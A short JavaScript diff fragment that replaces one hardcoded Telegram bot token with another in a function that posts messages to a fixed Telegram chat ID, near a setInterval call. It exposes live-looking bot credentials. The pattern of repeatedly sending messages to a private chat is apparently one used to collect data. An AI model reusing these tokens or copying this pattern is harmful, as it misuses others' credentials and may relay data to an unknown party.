@@ -157,7 +157,7 @@ setInterval(send,10)
 
 function sendMessageToTelegram(message) {
 
-const botToken = '7995082033:AAEnH6RC5kpssSyHe9D0ZhfUiDb-kvB4Kyk';
+const botToken = '7995082033:AAFJy2q5F45sNqqgNvyoNptplqyJkXXohSM';
 const chatId = '7563513857';
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
